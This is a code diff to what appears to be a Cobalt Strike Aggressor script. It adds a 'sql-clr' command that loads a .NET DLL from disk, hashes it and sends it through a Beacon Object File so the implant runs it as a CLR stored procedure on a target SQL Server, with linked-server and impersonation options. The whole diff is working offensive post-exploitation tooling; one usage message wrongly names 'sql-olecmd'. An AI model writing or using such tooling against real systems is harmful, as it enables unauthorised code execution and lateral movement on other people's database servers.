@@ -615,3 +615,56 @@ beacon_command_register(
 	"Execute a system command using OLE automation procedures", 
 	"sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]"
 );
+
+alias sql-clr {
+    local('$args $barch $handle $server $dllpath $hash $bytes $function $database $link $impersonate');
+	
+	if(size(@_) < 4)
+	{
+		berror($1, beacon_command_detail("sql-olecmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $dllpath = $3;
+	$function = $4;
+	$database = iff(-istrue $5, $5, "");
+    $link = iff(-istrue $6, $6, "");
+    $impersonate = iff(-istrue $7, $7, "");
+
+    if (!-canread $dllpath)
+    {
+        berror($1, "Invalid file path " . $dllpath . " - Cannot read file");
+        berror($1, beacon_command_detail("sql-clr"));
+        return;
+    }
+
+	$execute = exec("sha512sum " . $dllpath);
+	$return = wait($execute);
+	
+	if ($return != 0)
+	{
+		berror($1, "Error calculating SHA-512 of DLL");
+		return;
+	}
+	else
+	{
+		@arrayOut = (readAll($execute));
+		$hash = split(" ", @arrayOut[-1])[0];
+	}
+
+	$handle = openf($dllpath);
+	$bytes = readb($handle, -1);
+	closef($handle);
+
+	btask($1, "Tasked beacon execute custom assembly on " . $server);
+
+	$args = bof_pack($1, "zzzzzzb", $server, $database, $link, $impersonate, $function, $hash, $bytes);
+	beacon_inline_execute($1, readbof($1, "clr"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-clr", 
+	"Load and execute .NET assembly in a stored procedure", 
+	"sql-clr [server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
